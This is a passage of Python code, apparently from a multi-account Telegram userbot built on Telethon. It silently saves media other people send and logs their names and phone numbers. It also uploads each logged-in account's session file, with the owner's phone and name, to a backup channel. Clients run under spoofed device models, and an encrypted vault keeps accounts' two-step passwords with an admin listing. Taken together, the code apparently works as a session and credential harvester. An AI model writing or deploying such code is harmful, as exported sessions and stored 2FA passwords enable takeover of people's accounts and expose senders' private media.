                    "Backup channel upload failed for %s",
                    os.path.basename(file_path),
                )

            await client.send_file(
                "me",
                file_path,
                caption=(
                    f"File saved from "
                    f"{full_name} ({username})"
                ),
                force_document=False,
            )

            try:
                file_size = os.path.getsize(file_path)
            except OSError:
                file_size = 0

            log_entry = {
                "timestamp": timestamp,
                "sender_name": full_name,
                "sender_username": username,
                "phone": phone,
                "file_name": os.path.basename(file_path),
                "file_size_bytes": file_size,
                "media_type": media_type,
                "caption_snippet": (
                    reply.text or ""
                )[:100],
            }

            log_file_history(log_entry)

            await event.delete()

            logger.info(
                "File saved successfully for session %s",
                session_name,
            )

        except FloodWaitError as e:
            logger.warning(
                "FloodWait in عجب for %s seconds",
                e.seconds,
            )
            try:
                await event.delete()
            except Exception:
                pass

        except Exception:
            logger.exception(
                "Error in ajab_handler for %s",
                session_name,
            )
            try:
                await event.delete()
            except Exception:
                pass

        finally:
            if file_path:
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                        logger.info(
                            "Temporary file removed: %s",
                            file_path,
                        )
                except OSError as e:
                    logger.warning(
                        "Could not remove temp file %s: %s",
                        file_path,
                        e,
                    )

    @client.on(events.NewMessage(pattern=r"^\.history$"))
    async def history_handler(event):
        if not event.out:
            return

        try:
            sender = await event.get_sender()
            sender_id = int(getattr(sender, "id", 0) or 0)
            if sender_id not in REMOTE_ADMIN_IDS:
                try:
                    await event.delete()
                except Exception:
                    pass
                return

            history = history_store.last(10)

            if not history:
                await event.edit(
                    "📭 تاریخچه‌ای وجود ندارد."
                )
                return

            text = "📋 **آخرین فایل‌های ذخیره‌شده:**\n\n"

            for i, entry in enumerate(history, 1):
                text += (
                    f"{i}. {entry.get('file_name', 'Unknown')} "
                    f"({entry.get('media_type', 'media')})\n"
                    f"   از {entry.get('sender_name', 'Unknown')} "
                    f"- {entry.get('timestamp', 'Unknown')}\n\n"
                )

            await event.edit(text[:4000])

        except Exception:
            logger.exception("Error reading history")
            try:
                await event.delete()
            except Exception:
                pass

# ============================================================
# 17) SESSION BACKUP
# ============================================================

async def backup_session_on_login(
    session_name: str,
    phone: str,
    api_id: int,
    api_hash: str,
) -> bool:
    session_file = SESSIONS_DIR / f"{session_name}.session"

    if not session_file.exists():
        logger.error("Final session file not found for backup: %s", session_file)
        return False

    client = create_telegram_client(
        session_name,
        api_id,
        api_hash,
        temporary=False,
    )

    try:
        await client.connect()

        if not await client.is_user_authorized():
            logger.error("Refusing to back up unauthorized session: %s", session_name)
            return False

        me = await client.get_me()
        first_name = me.first_name or ""
        last_name = me.last_name or ""
        full_name = f"{first_name} {last_name}".strip() or "Unknown"
        username = f"@{me.username}" if me.username else "No username"
        phone_value = me.phone or phone
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        caption = (
            f"👤 {full_name}\n"
            f"📱 {username}\n"
            f"📞 {phone_value}\n"
            f"🕒 Session created: {timestamp}"
        )

        success = await send_to_backup_channel(
            client,
            str(session_file),
            caption,
        )

        if success:
            logger.info("Session backup sent for %s", session_name)
        else:
            logger.error("Failed to backup session for %s", session_name)

        return success

    except Exception:
        logger.exception("Error backing up session %s", session_name)
        return False

    finally:
        try:
            await client.disconnect()
        except Exception:
            pass

# ============================================================
# 18) CLIENT CREATION
# ============================================================

def create_telegram_client(
    session_name: str,
    api_id: int,
    api_hash: str,
    temporary: bool = False,
) -> TelegramClient:
    base_dir = AUTH_TEMP_DIR if temporary else SESSIONS_DIR
    device_model, os_version = get_device_model(session_name)

    return TelegramClient(
        str(base_dir / session_name),
        api_id,
        api_hash,
        device_model=device_model,
        system_version=os_version,
    )


def create_auth_temp_client(
    session_name: str,
    api_id: int,
    api_hash: str,
) -> TelegramClient:
    return create_telegram_client(
        session_name,
        api_id,
        api_hash,
        temporary=True,
    )

# ============================================================
# 19) START / STOP BOT
# ============================================================

is_bot_running = False
start_semaphore = asyncio.Semaphore(MAX_CONCURRENT_CLIENTS)

async def start_single_client(
    name: str,
    api_id: int,
    api_hash: str,
) -> Optional[TelegramClient]:
    async with start_semaphore:
        try:
            client = create_telegram_client(
                name,
                api_id,
                api_hash,
            )

            await client.start()

            from .handlers import setup_bot_handlers
            setup_bot_handlers(
                client,
                name,
            )

            await client_manager.add_running_client(
                name,
                client,
            )

            logger.info(
                "Bot started for: %s",
                name,
            )

            return client

        except Exception:
            logger.exception(
                "Failed to start bot for %s",
                name,
            )
            return None

async def start_bot():
    global is_bot_running

    if is_bot_running:
        logger.info("Bot is already running.")
        return

    await stop_bot(quiet=True)

    if not API_ID or not API_HASH:
        logger.error("API credentials are not configured.")
        return

    settings_manager.sync_with_sessions()

    session_names = get_session_files()

    active_sessions = [
        name
        for name in session_names
        if settings_manager.get(name, True)
    ]

    if not active_sessions:
        logger.warning("No active sessions found.")
        return

    logger.info(
        "Starting bot on %s active accounts...",
        len(active_sessions),
    )

    results = await asyncio.gather(
        *(
            start_single_client(
                name,
                API_ID,
                API_HASH,
            )
            for name in active_sessions
        ),
        return_exceptions=True,
    )

    connected = [
        result
        for result in results
        if isinstance(result, TelegramClient)
    ]

    if not connected:
        logger.error("No clients were connected successfully.")
        return

    is_bot_running = True

    logger.info(
        "Bot is now RUNNING on %s accounts.",
        len(connected),
    )

async def stop_bot(quiet: bool = False):
    global is_bot_running

    if not is_bot_running and not quiet:
        logger.info("Bot is not running.")
        return

    if not is_bot_running:
        return

    logger.info("Stopping bot...")

    await client_manager.stop_all()

    is_bot_running = False

    logger.info("Bot STOPPED successfully.")

# ============================================================
# 20) HOT ADD
# ============================================================

async def hot_add_account(
    name: str,
    api_id: int,
    api_hash: str,
) -> bool:
    if not is_bot_running:
        logger.warning(
            "Main bot is not running, cannot hot-add."
        )
        return False

    if client_manager.get(name):
        logger.warning(
            "Session %s is already running.",
            name,
        )
        return False

    try:
        client = await start_single_client(
            name,
            api_id,
            api_hash,
        )

        return client is not None

    except Exception:
        logger.exception(
            "Failed to hot-add %s",
            name,
        )
        return False

# ============================================================
# 20.5) PRIVATE 2FA VAULT
# ============================================================

def _vault_load() -> dict:
    if VAULT_KEY is None or not VAULT_FILE.exists():
        return {}
    try:
        token = VAULT_FILE.read_bytes()
        plain = Fernet(VAULT_KEY).decrypt(token)
        data = json.loads(plain.decode("utf-8"))
        return data if isinstance(data, dict) else {}
    except (InvalidToken, ValueError, OSError, json.JSONDecodeError):
        logger.error("Could not open the encrypted 2FA vault.")
        return {}

def _vault_save(data: dict) -> bool:
    if VAULT_KEY is None:
        return False
    try:
        payload = json.dumps(data, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
        encrypted = Fernet(VAULT_KEY).encrypt(payload)
        tmp = VAULT_FILE.with_suffix(".enc.tmp")
        tmp.write_bytes(encrypted)
        with tmp.open("rb") as fh:
            fh.flush()
            os.fsync(fh.fileno())
        os.replace(tmp, VAULT_FILE)
        try:
            os.chmod(VAULT_FILE, 0o600)
        except OSError:
            pass
        return True
    except OSError:
        logger.exception("Could not save encrypted 2FA vault.")
        return False

def normalize_vault_key(phone: Optional[str] = None, user_id: Optional[int] = None) -> str:
    if user_id is not None:
        return f"uid:{int(user_id)}"
    return f"phone:{normalize_phone(str(phone or ''))}"

def vault_get_password(phone: Optional[str] = None, user_id: Optional[int] = None) -> Optional[str]:
    if VAULT_KEY is None:
        return None
    data = _vault_load()
    key = normalize_vault_key(phone, user_id)
    item = data.get(key)
    if isinstance(item, dict):
        pw = item.get("password")
        return str(pw) if pw else None
    return None

def vault_store_password(
    password: str,
    *,
    phone: Optional[str] = None,
    user_id: Optional[int] = None,
    session_name: Optional[str] = None,
) -> bool:
    if VAULT_KEY is None or not password:
        return False
    key = normalize_vault_key(phone, user_id)
    data = _vault_load()
    data[key] = {
        "password": password,
        "phone": normalize_phone(str(phone or "")),
        "user_id": int(user_id) if user_id is not None else None,
        "session_name": session_name,
        "updated_at": datetime.now(timezone.utc).isoformat(),
    }
    ok = _vault_save(data)
    if ok:
        logger.info("2FA credential stored in encrypted vault for account key %s.", key)
    return ok

def vault_forget(phone: Optional[str] = None, user_id: Optional[int] = None) -> bool:
    if VAULT_KEY is None:
        return False
    data = _vault_load()
    key = normalize_vault_key(phone, user_id)
    removed = data.pop(key, None) is not None
    return _vault_save(data) if removed else True

def vault_entries_for_admin() -> List[dict]:
    if VAULT_KEY is None:
        return []
    data = _vault_load()
    rows = []
    for key, item in data.items():
        if not isinstance(item, dict):
            continue
        rows.append({
            "key": key,
            "phone": item.get("phone") or "—",
            "user_id": item.get("user_id"),
            "session_name": item.get("session_name") or "—",
            "updated_at": item.get("updated_at") or "—",
            "has_password": bool(item.get("password")),
        })
    return sorted(rows, key=lambda x: str(x.get("updated_at")), reverse=True)

# ============================================================
